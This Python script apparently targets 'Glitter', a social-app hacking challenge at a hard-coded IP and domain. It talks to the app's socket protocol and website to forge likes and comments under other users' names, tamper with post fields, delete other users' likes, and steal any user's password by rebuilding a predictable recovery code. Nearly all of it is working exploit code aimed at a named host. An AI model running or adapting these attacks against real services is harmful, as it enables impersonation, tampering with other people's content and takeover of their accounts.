import socket
import requests
import json
from datetime import datetime

SERVER_IP = "54.187.16.171"
WEBSITE_DOMAIN = "http://cyber.glitter.org.il"
SERVER_PORT = 1336


def send_to_server(data, sock):

    sock.sendall(data.encode())

    res = sock.recv(1024 * 8).decode()

    return res


def stringToJson(res):
    print(res)
    return json.loads(res[res.index("{gli&&er}") + len('{gli&&er}'): -3])


def loginApp(username, password, sock):
    data = '100#{gli&&er}{"user_name":"%s","password":"%s","enable_push_notifications":true}##' % (
        username, password)

    res = send_to_server(data, sock)
    print(res)
    if "Login received" not in res:
        return -1
    checksum_ascii = '110#{gli&&er}%d##' % (
        sum([ord(i) for i in username + password]))
    res = send_to_server(checksum_ascii, sock)

    if "Authentication approved" in res:
        return stringToJson(res)
    return -1


# ------


def getUserGlits(socket, user):
    data = '500#{gli&&er}{"feed_owner_id":%d,"end_date":"%s","glit_count":20}##' % (
        user["id"], user["date"])
    res = send_to_server(data, socket)
    return stringToJson(res)


def LikesToGlit(sock, user):
    glits = getUserGlits(sock, user)
    if len(glits["glits"]) == 0:
        print("You don't have any glits!\n")
        return
    print("Please choose what glit you want to add likes to: ")

    i = 1
    for glit in glits["glits"]:
        print("\t[%d] - %s " % (i, glit["content"]))
        i += 1

    choice = int(input(">> "))
    if choice <= 0 or choice > len(glits["glits"]):
        print("Invalid choice!")
        return
    how_many_likes = int(
        input("Please enter how many likes do you want to add to this glit: "))

    for i in range(how_many_likes):
        data = '710#{gli&&er}{"glit_id":%d,"user_id":%d,"user_screen_name":"%s","id":-1}##' % (
            glits["glits"][choice - 1]["id"], user["id"], user["user_name"])
        if "Like publish approved" in send_to_server(data,  sock):
            print("Added %d likes" % (i + 1))
        else:
            print("Error adding likes!")


def LikesToGlitDifferentUsername(sock, user):
    glits = getUserGlits(sock, user)
    print("Please choose what glit you want to add like to: ")

    i = 1
    for glit in glits["glits"]:
        print("\t[%d] - %s " % (i, glit["content"]))
        i += 1

    choice = int(input(">> "))
    if choice <= 0 or choice > len(glits["glits"]):
        print("Invalid choice!")
        return
    different_username = input(
        "Please enter the username you want to like with: ")

    data = '710#{gli&&er}{"glit_id":%d,"user_id":%d,"user_screen_name":"%s","id":-1}##' % (
        glits["glits"][choice - 1]["id"], user["id"], different_username)
    res = send_to_server(data,  sock)

    if "Like publish approved" in res:
        print("Added a like with username: %s" % (different_username))
    else:
        print("Error adding like!")


def postGlitDifferentColor(sock, user):

    glit_content = input("Please enter the new glit content: ")

    color = input(
        "Please enter the color of the glit (It can be any string, even random letters) ")

    data = '550#{gli&&er}{"feed_owner_id":%d,"publisher_id":%d,"publisher_screen_name":"%s","publisher_avatar":"%s","background_color":"%s","date":"%s","content":"%s","font_color":"black","id":-1}##' % (
        user["id"], user["id"], user["screen_name"], user["avatar"], color, user["date"], glit_content)

    res = send_to_server(data,  sock)
    if "Glit publish approved" in res:
        print("Successfully created a glit!")
    else:
        print("Couldn't create a glit!")


def postGlitDifferentAvatar(sock, user):

    glit_content = input("Please enter the new glit content: ")

    avatar = input(
        "Please enter the avatar of the glit (im1, im2.. im8) ")

    data = '550#{gli&&er}{"feed_owner_id":%d,"publisher_id":%d,"publisher_screen_name":"%s","publisher_avatar":"%s","background_color":"White","date":"%s","content":"%s","font_color":"black","id":-1}##' % (
        user["id"], user["id"], user["screen_name"], avatar, user["date"], glit_content)

    res = send_to_server(data,  sock)
    if "Glit publish approved" in res:
        print("Successfully created a glit!")
    else:
        print("Couldn't create a glit!")


def postGlitDifferentDate(sock, user):
    glit_content = input("Please enter the new glit content: ")

    new_date = input(
        "Please enter the new date of the glit (YYYY-MM-DDTHH:MM:SSSSSZ) ")

    data = '550#{gli&&er}{"feed_owner_id":%d,"publisher_id":%d,"publisher_screen_name":"%s","publisher_avatar":"%s","background_color":"White","date":"%s","content":"%s","font_color":"black","id":-1}##' % (
        user["id"], user["id"], user["screen_name"], user["avatar"], new_date, glit_content)

    res = send_to_server(data,  sock)
    if "Glit publish approved" in res:
        print("Successfully created a glit!")
    else:
        print(res)
        print("Couldn't create a glit!")


def postGlitDifferentFontColor(sock, user):
    glit_content = input("Please enter the new glit content: ")

    font_color = input(
        "Please enter font font color of the glit: ")

    data = '550#{gli&&er}{"feed_owner_id":%d,"publisher_id":%d,"publisher_screen_name":"%s","publisher_avatar":"%s","background_color":"White","date":"%s","content":"%s","font_color":"%s","id":-1}##' % (
        user["id"], user["id"], user["screen_name"], user["avatar"], user["date"], glit_content, font_color)

    res = send_to_server(data,  sock)
    if "Glit publish approved" in res:
        print("Successfully created a glit!")
    else:
        print(res)
        print("Couldn't create a glit!")


def removeOtherUserLike(sock, user):
    like_id = input("Please enter the like id you want to remove: ")
    data = '720#{gli&&er}%s##' % (like_id)
    res = send_to_server(data,  sock)
    print(res)
    if "725#Unlike publish approved" in res:
        print("Successfully removed this like!")
    else:
        print(res)
        print("Couldn't create a like! (probably because there isn't a like with that id)")


def postCommentDifferentDate(sock, user):
    glits = getUserGlits(sock, user)
    print("Please choose what glit you want to add comment to: ")

    i = 1
    for glit in glits["glits"]:
        print("\t[%d] - %s " % (i, glit["content"]))
        i += 1

    choice = int(input(">> "))
    if choice <= 0 or choice > len(glits["glits"]):
        print("Invalid choice!")
        return
    comment_content = input(
        "Please enter the content of the comment:")

    comment_date = input(
        "Please enter the different date of the comment (YYYY-MM-DDTHH:MM:SSSSSZ) ")

    data = '650#{gli&&er}{"glit_id":%d,"user_id":%d,"user_screen_name":"%s","id":-1,"content":"%s","date":"%s"}##' % (
        glits["glits"][choice - 1]["id"], user["id"], user["screen_name"], comment_content, comment_date)

    res = send_to_server(data,  sock)
    print(res)

    if "655#Comment publish approved" in res:
        print("Added a comment with content: %s" % (comment_content))
    else:
        print("Error adding comment!")


def postCommentDifferentUsername(sock, user):
    glits = getUserGlits(sock, user)
    print("Please choose what glit you want to add comment to: ")

    i = 1
    for glit in glits["glits"]:
        print("\t[%d] - %s " % (i, glit["content"]))
        i += 1

    choice = int(input(">> "))
    if choice <= 0 or choice > len(glits["glits"]):
        print("Invalid choice!")
        return
    comment_content = input(
        "Please enter the content of the comment:")

    comment_username = input(
        "Please enter the username you want to comment with: ")

    data = '650#{gli&&er}{"glit_id":%d,"user_id":%d,"user_screen_name":"%s","id":-1,"content":"%s","date":"%s"}##' % (
        glits["glits"][choice - 1]["id"], user["id"], comment_username, comment_content, user["date"])

    res = send_to_server(data,  sock)
    print(res)

    if "655#Comment publish approved" in res:
        print("Added a comment with content: %s" % (comment_content))
    else:
        print("Error adding comment!")

# Website challenges


def loginWebsite(username, password):
    res = requests.post(WEBSITE_DOMAIN +
                        "/user/", headers={"Content-Type": "application/json"}, json=[username, password]).text
    if "Login Failure" in res or res == None:
        return None
    return json.loads(res)


def getUsers(logged_in_acc, username):
    res = requests.get(
        WEBSITE_DOMAIN + "/entities?searchType=SIMPLE&searchEntry=" + username, cookies={"sparkle": logged_in_acc["sparkle"]}).text
    return json.loads(res)


def passwordChallenge(acc_data):
    print("Hi!\nIn this challenge you will be able to steal other users passwords by giving their usernames!")
    username = input(
        "Please enter the username that you want to steal its password: ")

    found_users = getUsers(acc_data, username)
    i = 1
    for user in found_users:
        print("%d. %s" % (i, user["screen_name"]))
        i += 1
    print("Please choose the user you want to find the password of ")
    choice = int(input(">> "))
    if choice <= 0 or choice > len(found_users):
        print("Invalid choice!")
        return
    found_user = found_users[choice - 1]
    now = datetime.now()
    varitification_code = now.strftime(
        "%d%m" + "".join([chr(int(i) + ord("A")) for i in str(found_user['id'])]) + "%H%M")
    print(found_user)
    res = requests.post(WEBSITE_DOMAIN +
                        "/password-recovery-code-request/", headers={"Content-Type": "application/json"}, data='"' + found_user["screen_name"] + '"').text
    res = requests.post(WEBSITE_DOMAIN +
                        "/password-recovery-code-verification/", headers={"Content-Type": "application/json"}, json=[found_user["screen_name"], varitification_code]).text
    print(varitification_code)
    if "Server Failure" in res:
        print(res)
        print("Error, couldn't find the password")
    else:
        print("The password of that account is: " + res)
